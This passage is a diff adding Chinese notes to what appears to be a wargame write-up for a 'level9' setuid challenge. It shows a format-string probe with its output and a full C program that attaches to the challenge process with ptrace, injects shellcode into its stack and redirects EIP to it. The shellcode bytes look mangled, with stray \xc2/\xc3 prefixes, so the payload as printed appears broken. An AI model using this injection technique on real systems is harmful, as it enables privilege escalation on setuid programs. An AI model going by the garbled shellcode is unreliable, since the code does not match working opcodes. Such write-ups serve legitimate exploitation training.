@@ -131,3 +131,102 @@ hellcode because the ptrace call prevented us from calling execve.
  parent a chance to gain control before the new program begins execution. A 
  process probably shouldn't make this request if its parent isn't expecting 
  to trace it. (pid, addr, and data are ignored.)
+
+1. 想法1，利用LD_PRELOAD加载一个自己的动态库替换掉ptrace函数，让它返回-1，从而可以利用
+字符串格式化漏洞，但是setuid的程序都不会加载用户自定义的动态库：
+[level9@logic level9]$ /levels/level9/level9 $(perl -e 'print "AAAA"."[%08x]"x(10)') (该level9程序拥有者为level10,是一个setuid的程序)
+AAAA[%08x][%08x][%08x][%08x][%08x][%08x][%08x][%08x][%08x][%08x]
+[level9@logic level9]$ 
+
+[level9@logic level9]$ ./level9 $(perl -e 'print "AAAA"."[%08x]"x(10)')        (该level9程序拥有者为level9)      
+AAAA[bfffdbed][00000040][00000000][bfffda50][41414141][3830255b][255b5d78]
+[5d783830][3830255b][255b5d78]
+[level9@logic level9]$ 
+
+2. 我们自己来处理ptrace(PTRACE_TRACEME,0,0,0)
+
+#include <sys/ptrace.h>
+#include <sys/fcntl.h>
+#include <sys/user.h>
+#include <sys/wait.h>
+#include <signal.h>
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <errno.h>
+
+void traphdl(int s) {
+  printf("TRAP caught.\n");
+}
+
+int main(int an, char **ac, char **environ) {
+  char shellcode[] = "\xc2\x90\xc2\x90\xc2\x90\xc2\x90\xc2\x90\x31\xc3\x80\xc2\x99\xc2\xb0\x05\x68\x43\x54\x46\x00\x68\x2e\x73\x6d\x70\xc2\x89\xc3\xa3\x31\xc3\x89\xc3\x8d\xc2\x80\xc2\x89\xc3\x86\xc2\x89\xc3\x90\xc2\xb0\x03\xc2\x89\xc3\xb3\xc2\x89\xc3\xa1\xc2\xb2\x60\xc3\x8d\xc2\x80\x31\xc3\x80\xc2\xb0\x04\x31\xc3\x9b\xc3\x8d\xc2\x80";
+  int f;
+
+  signal(SIGTRAP, traphdl);
+  f = fork();
+  if (f == 0) {
+    int g = open("/tmp/.hesso/flagX", O_TRUNC|O_RDWR, 0666);
+    dup2(g, 1);
+    dup2(g, 2);
+    char *X[2] = { "/usr/smp/challenge9/challenge9", NULL };
+    execve(X[0], X, environ);
+    return 255;
+  } else if (f > 0) {
+    int W = 0, S;
+    sleep(2);
+    kill(f, SIGCHLD);  /* 向子进程发送信号，从而让子进程停止执行，并向父进程发送消息，从而被跟踪 */
+    while (W == 0 || errno != ECHILD) {
+      errno = 0;
+      W = waitpid(f, &S, 0);
+      if (W == f && WIFSTOPPED(S) && WSTOPSIG(S) == SIGCHLD) {
+        struct user_regs_struct U;
+        unsigned long p, p2, pE;
+
+        memset(&U, 0, sizeof(U));
+        ptrace(PTRACE_GETREGS, f, 0, &U);
+        fprintf(stderr, "EIP/EBP/ESP: %p / %p / %p\n", U.eip, U.ebp, U.esp);
+
+        for (p = U.ebp; p; ) {
+          p2 = ptrace(PTRACE_PEEKDATA, f, p, 0);
+          pE = ptrace(PTRACE_PEEKDATA, f, p+4, 0);
+          fprintf(stderr, "EBP at %p has %p, r-eip %p\n", p, p2, pE);
+          p = p2;
+          if ((pE & 0xfff) == 0x930) {
+            break;
+          }
+        }
+
+        // RWX memory at (p)
+
+        for (p2 = 0; p2 < sizeof(shellcode); p2 += 4) {
+          ptrace(PTRACE_POKEDATA, f, p + p2, *(long *)(shellcode + p2));
+        }
+        for (p2 = 0; p2 < 40; p2 += 4) {
+          fprintf(stderr, "Stack frame at %p: %8.8x\n", p+p2, ptrace(PTRACE_PEEKDATA, f, p+p2, 0));
+        }
+
+        U.eip = p+2;
+        U.esp = U.eip + 150;
+        ptrace(PTRACE_SETREGS, f, 0, &U);
+        ptrace(PTRACE_GETREGS, f, 0, &U);
+        fprintf(stderr, "EIP before/after: %p\n", U.eip);
+
+        while (1) {
+          ptrace(PTRACE_SINGLESTEP, f, 0, 0);
+          (void)waitpid(f, &S, 0);
+          ptrace(PTRACE_GETREGS, f, 0, &U);
+          printf("Now at %p\n", U.eip);
+          usleep(100000);
+        }
+
+        ptrace(PTRACE_DETACH, f, 0, 0);
+      } else if (W == f) {
+        ptrace(PTRACE_DETACH, f, 0, 0);
+      }
+    }
+  }
+
+  return 0;
+}
